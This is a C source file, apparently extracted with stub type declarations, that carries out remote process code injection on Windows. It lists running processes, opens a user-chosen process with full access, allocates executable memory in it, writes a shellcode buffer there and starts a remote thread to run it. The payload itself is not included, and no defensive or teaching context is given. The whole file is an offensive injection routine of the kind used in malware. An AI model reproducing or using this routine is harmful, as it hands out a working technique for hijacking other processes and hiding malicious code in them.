
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


typedef int ps ;
struct TYPE_4__ {int dwSize; char* szExeFile; int th32ProcessID; } ;
typedef TYPE_1__ PROCESSENTRY32 ;
typedef int LPTHREAD_START_ROUTINE ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;


 int CloseHandle (scalar_t__) ;
 int CreateRemoteThread (scalar_t__,int *,int ,int ,int *,int ,int ) ;
 scalar_t__ CreateToolhelp32Snapshot (int ,int ) ;
 scalar_t__ INVALID_HANDLE_VALUE ;
 int MEM_COMMIT ;
 scalar_t__ OpenProcess (int ,int ,int ) ;
 int PAGE_EXECUTE_READ ;
 int PAGE_EXECUTE_READWRITE ;
 int PROCESS_ALL_ACCESS ;
 int Process32First (scalar_t__,TYPE_1__*) ;
 scalar_t__ Process32Next (scalar_t__,TYPE_1__*) ;
 int TH32CS_SNAPPROCESS ;
 scalar_t__ VirtualAllocEx (scalar_t__,int *,int ,int ,int ) ;
 int VirtualProtectEx (scalar_t__,scalar_t__,int ,int ,int *) ;
 int WriteProcessMemory (scalar_t__,scalar_t__,int ,int ,int *) ;
 int printf (char*,...) ;
 int scanf (char*,int *) ;
 int shellcode ;
 int strlen (int ) ;

int main()
{
 HANDLE snap,proc,mem;
 DWORD len,l,pid;
 PROCESSENTRY32 ps;


 ps.dwSize=sizeof(ps);
 len=strlen(shellcode);


 snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
 if(snap==INVALID_HANDLE_VALUE)
 {
  printf("CreateToolhelp32Snapshot() Failed");
  return 0;
 }


 if(!Process32First(snap,&ps))
 {
  printf("Process32First() Failed");
  return 0;
 }



 do
 {
  printf("%s : %ld\n",ps.szExeFile,ps.th32ProcessID);
 }while(Process32Next(snap,&ps));

 printf("\nEnter Process ID: ");
 scanf("%ld",&pid);


 proc=OpenProcess(PROCESS_ALL_ACCESS,0,pid);

 if(!proc)
 {
  printf("Failed to Open Process");
  return 0;
 }

 mem=VirtualAllocEx(proc,((void*)0),len,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
 if(!mem)
 {
  printf("Failed to allocate memory in process");
  return 0;
 }

 WriteProcessMemory(proc,mem,shellcode,len,((void*)0));
 VirtualProtectEx(proc,mem,len,PAGE_EXECUTE_READ,&l);

 CreateRemoteThread(proc,((void*)0),0,(LPTHREAD_START_ROUTINE)mem,((void*)0),0,0);
 CloseHandle(proc);

 return 0;
}
